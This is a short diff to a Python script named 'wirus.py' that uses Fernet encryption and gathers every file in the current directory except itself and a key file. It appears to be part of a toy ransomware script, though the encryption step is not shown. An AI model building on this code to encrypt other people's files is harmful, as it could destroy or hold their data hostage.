@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-    if file == "wirus.py" or file == "key.py":
+    if file == "wirus.py" or file == "klucz.key":
         continue
     if os.path.isfile(file):
         files.append(file)
